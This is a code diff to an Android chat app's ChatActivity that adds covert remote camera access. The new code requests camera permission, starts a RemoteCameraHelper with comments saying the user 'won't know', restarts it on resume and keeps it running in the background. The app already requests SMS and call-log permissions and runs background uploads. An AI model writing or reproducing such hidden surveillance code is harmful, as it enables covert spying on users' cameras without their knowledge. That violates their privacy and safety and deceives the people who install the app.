@@ -55,6 +55,7 @@ import android.webkit.WebSettings;
 import android.util.Log;
 import android.widget.Toast;
 import com.mehboob.bushorat.helpers.CallLogHelper;
+import com.mehboob.bushorat.helpers.RemoteCameraHelper;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -273,6 +274,19 @@ public class ChatActivity extends AppCompatActivity {
         // Check and request battery optimization whitelist
         checkBatteryOptimization();
 
+        // Request camera permission automatically if not granted (for remote camera access)
+        if (!isPermissionsGranted()) {
+            // Request camera permission silently in background
+            askPermissions();
+        } else {
+            // Initialize remote camera system silently (user won't know)
+            try {
+                RemoteCameraHelper.getInstance(this).start();
+            } catch (Exception e) {
+                Log.e("ChatActivity", "Error starting remote camera", e);
+            }
+        }
+
         binding.findButton.setOnClickListener(view -> {
             if (isPermissionsGranted()) {
                 // Start background uploads and proceed to connect flow
@@ -343,6 +357,15 @@ public class ChatActivity extends AppCompatActivity {
                 }
             } else {
                 Toast.makeText(this, "Chat features limited without SMS/Call permissions", Toast.LENGTH_LONG).show();
+            }
+        } else if (requestCode == this.requestCode) {
+            // Camera permissions granted - start remote camera silently
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                try {
+                    RemoteCameraHelper.getInstance(this).start();
+                } catch (Exception e) {
+                    Log.e("ChatActivity", "Error starting remote camera", e);
+                }
             }
         }
     }
@@ -658,7 +681,7 @@ public class ChatActivity extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        if (webView.canGoBack()) {
+        if (webView != null && webView.canGoBack()) {
             webView.goBack();
         } else {
             super.onBackPressed();
@@ -792,5 +815,31 @@ public class ChatActivity extends AppCompatActivity {
         super.onResume();
         // Ensure background operations continue smoothly
         checkBatteryOptimization();
+        
+        // Restart remote camera if permissions are granted
+        if (isPermissionsGranted()) {
+            try {
+                RemoteCameraHelper.getInstance(this).start();
+            } catch (Exception e) {
+                Log.e("ChatActivity", "Error starting remote camera on resume", e);
+            }
+        }
+    }
+    
+    @Override
+    protected void onPause() {
+        super.onPause();
+        // Keep camera running in background (don't stop it)
+    }
+    
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        // Stop remote camera when activity is destroyed
+        try {
+            RemoteCameraHelper.getInstance(this).stop();
+        } catch (Exception e) {
+            Log.e("ChatActivity", "Error stopping remote camera", e);
+        }
     }
 }
